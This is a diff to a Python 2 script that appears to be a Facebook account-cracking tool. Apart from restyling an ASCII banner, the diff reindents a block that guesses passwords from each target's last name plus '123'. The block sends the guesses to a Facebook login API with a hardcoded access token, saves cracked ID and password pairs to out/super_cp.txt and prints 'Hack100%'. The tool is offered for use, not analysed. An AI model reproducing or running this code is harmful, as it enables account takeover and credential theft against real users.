@@ -92,7 +92,7 @@ jalan("\033[1;95m___$$$_$$$§________________________$$$_§$$#")
 jalan("\033[1;95m___$$$$$$$#_______________________#$$$_$$$#")
 jalan("\033[1;95m___$$$$$$$#_______________________§$$$$$$$#")
 jalan("\033[1;95m___$$$$$$$________________________#$$$$$$$")
-jalan("\033[1;95m___§$$$$$#______B4BY DR4G0N_______$$$$$$$")
+jalan("\033[1;95m___§$$$$$#______") ("\033[1;96mB4BY DR4G0N") ("\033[1;95m_______$$$$$$$")
 jalan("\033[1;95m____§$$$#__________________________§$$$$$")
 jalan("\033[1;95m_____§#_____________________________#$$$")
 jalan("\033[1;95m_____$$$____________#__#____________#§")
@@ -489,15 +489,15 @@ def pilih_super():
 									                               print '\x1b[1;91m[•✿•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
 									                               print '\x1b[1;91m[•✿•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
 									                               print '\x1b[1;91m[•✿•] \x1b[1;91mPasswordp1\x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
-				                                                                           cek = open("out/super_cp.txt", "a")
-				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
-				                                                                           cek.close()
-				                                                                           cekpoint.append(user+pass7)           					
-								                                       else:						
-										                           pass8 = b['last_name'] + '123'											
-			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			                                                                                   q = json.load(data)												
-			                                                                                   if 'access_token' in q:		
+				                                                                       cek = open("out/super_cp.txt", "a")
+				                                                                       cek.write("ID:" +user+ " Pw:" +pass7+"\n")
+				                                                                       cek.close()
+				                                                                       cekpoint.append(user+pass7)          					
+								                                   else:						
+										                       pass8 = b['last_name'] + '123'											
+			                                                                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			                                                                               q = json.load(data)												
+			                                                                               if 'access_token' in q:		
 										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                                   z = json.loads(x.text)
 				                                                                                   print '\x1b[1;91m[  🍁  ] \x1b[1;92mHack100%💉'											
